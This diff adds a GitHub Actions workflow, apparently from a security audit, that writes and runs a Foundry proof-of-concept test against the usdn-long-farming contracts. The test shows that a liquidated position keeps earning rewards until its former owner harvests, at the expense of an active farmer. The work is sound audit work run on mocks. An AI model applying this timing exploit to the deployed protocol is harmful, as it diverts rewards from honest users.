@@ -1,0 +1,165 @@
+name: LongFarming post-liquidation reward PoC
+
+on:
+  push:
+    branches:
+      - audit/longfarming-post-liquidation-rewards
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout target repository
+        uses: actions/checkout@v4
+        with:
+          repository: SmarDex-Ecosystem/usdn-long-farming
+          ref: main
+          path: target
+
+      - name: Install Foundry
+        uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: nightly
+
+      - name: Install Node 20
+        uses: actions/setup-node@v4
+        with:
+          node-version: 20
+
+      - name: Install target dependencies
+        working-directory: target
+        run: |
+          git config --global url."https://github.com/".insteadOf "git@github.com:"
+          npm ci
+          forge soldeer install
+
+      - name: Add two-position regression PoC
+        working-directory: target
+        run: |
+          cat > test/unit/UsdnLongFarming/PostLiquidationAccrual.t.sol <<'EOF'
+          // SPDX-License-Identifier: UNLICENSED
+          pragma solidity ^0.8.26;
+
+          import { IUsdnProtocolTypes } from "@smardex-usdn-contracts/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";
+
+          import { USER_1, USER_2 } from "../../utils/Constants.sol";
+          import { UsdnLongFarmingBaseFixture } from "./utils/Fixtures.sol";
+          import { MockUsdnProtocol } from "./utils/MockUsdnProtocol.sol";
+
+          contract TestPostLiquidationAccrual is UsdnLongFarmingBaseFixture {
+              int24 internal constant STALE_TICK = 1234;
+              int24 internal constant ACTIVE_TICK = 2345;
+              uint256 internal constant VERSION = 123;
+              uint256 internal constant STALE_INDEX = 1;
+              uint256 internal constant ACTIVE_INDEX = 2;
+              uint256 internal constant SHARES_PER_POSITION = 10;
+              uint256 internal constant DELAY_BLOCKS = 100;
+
+              function setUp() public {
+                  _setUp();
+                  _depositPosition(USER_1, STALE_TICK, STALE_INDEX);
+                  _depositPosition(USER_2, ACTIVE_TICK, ACTIVE_INDEX);
+
+                  assertEq(farming.getTotalShares(), 2 * SHARES_PER_POSITION, "two equal positions must be registered");
+
+                  // Settle every reward that existed before liquidation so the test measures
+                  // only rewards emitted after the USDN position is already liquidated.
+                  vm.roll(block.number + 1);
+                  farming.harvest(STALE_TICK, VERSION, STALE_INDEX);
+                  farming.harvest(ACTIVE_TICK, VERSION, ACTIVE_INDEX);
+              }
+
+              function test_liquidatedPositionKeepsAccruingAndDilutesActiveFarmer() public {
+                  _markOnlyStalePositionLiquidated();
+
+                  uint256 attackerBalanceBefore = rewardToken.balanceOf(USER_1);
+                  uint256 activeBalanceBefore = rewardToken.balanceOf(USER_2);
+                  uint256 emission = rewardsProvider.getRewardsPerBlock() * DELAY_BLOCKS;
+
+                  // No LongFarming notification is made when the base USDN position is liquidated.
+                  vm.roll(block.number + DELAY_BLOCKS);
+
+                  // The liquidated position is still in the denominator for every newly emitted reward.
+                  assertEq(farming.getTotalShares(), 2 * SHARES_PER_POSITION, "liquidated shares remain stale");
+                  assertEq(
+                      farming.pendingRewards(STALE_TICK, VERSION, STALE_INDEX),
+                      emission / 2,
+                      "stale position receives post-liquidation rewards"
+                  );
+                  assertEq(
+                      farming.pendingRewards(ACTIVE_TICK, VERSION, ACTIVE_INDEX),
+                      emission / 2,
+                      "active farmer is diluted by stale shares"
+                  );
+
+                  // The former owner controls the notification timing and self-notifies after the delay.
+                  vm.prank(USER_1);
+                  (bool isLiquidated,) = farming.harvest(STALE_TICK, VERSION, STALE_INDEX);
+                  assertTrue(isLiquidated, "stale position must slash on harvest");
+                  assertEq(farming.getTotalShares(), SHARES_PER_POSITION, "shares are removed only at late notification");
+
+                  farming.harvest(ACTIVE_TICK, VERSION, ACTIVE_INDEX);
+
+                  uint256 attackerPostLiquidationGain = rewardToken.balanceOf(USER_1) - attackerBalanceBefore;
+                  uint256 activePostLiquidationGain = rewardToken.balanceOf(USER_2) - activeBalanceBefore;
+
+                  assertEq(attackerPostLiquidationGain, emission / 2, "former owner captures half the future emissions");
+                  assertEq(activePostLiquidationGain, emission / 2, "active farmer receives only half");
+                  assertEq(
+                      emission - activePostLiquidationGain,
+                      attackerPostLiquidationGain,
+                      "active farmer's shortfall equals the stale position's gain"
+                  );
+              }
+
+              function test_controlImmediateNotificationGivesAllFutureRewardsToActiveFarmer() public {
+                  _markOnlyStalePositionLiquidated();
+
+                  // Correct timing: remove the stale position immediately, before any new emission interval.
+                  vm.prank(USER_1);
+                  farming.harvest(STALE_TICK, VERSION, STALE_INDEX);
+                  assertEq(farming.getTotalShares(), SHARES_PER_POSITION, "stale shares removed immediately");
+
+                  uint256 activeBalanceBefore = rewardToken.balanceOf(USER_2);
+                  uint256 emission = rewardsProvider.getRewardsPerBlock() * DELAY_BLOCKS;
+                  vm.roll(block.number + DELAY_BLOCKS);
+                  farming.harvest(ACTIVE_TICK, VERSION, ACTIVE_INDEX);
+
+                  assertEq(
+                      rewardToken.balanceOf(USER_2) - activeBalanceBefore,
+                      emission,
+                      "without stale shares the active farmer receives the full future emission"
+                  );
+              }
+
+              function _depositPosition(address owner, int24 tick, uint256 index) internal {
+                  IUsdnProtocolTypes.Position memory position = IUsdnProtocolTypes.Position({
+                      validated: true,
+                      timestamp: uint40(block.timestamp),
+                      user: owner,
+                      totalExpo: 20,
+                      amount: 10
+                  });
+
+                  usdnProtocol.setPosition(position, VERSION, false);
+                  usdnProtocol.transferPositionOwnership(
+                      IUsdnProtocolTypes.PositionId(tick, VERSION, index), address(farming), ""
+                  );
+              }
+
+              function _markOnlyStalePositionLiquidated() internal {
+                  // The stock test mock has one global tickVersion. Override only the stale tick's
+                  // getTickVersion call so the active position remains live while the stale one is liquidated.
+                  vm.mockCall(
+                      address(usdnProtocol),
+                      abi.encodeWithSelector(MockUsdnProtocol.getTickVersion.selector, STALE_TICK),
+                      abi.encode(VERSION + 1)
+                  );
+              }
+          }
+          EOF
+
+      - name: Run PoC
+        working-directory: target
+        run: forge test --match-contract TestPostLiquidationAccrual -vvv
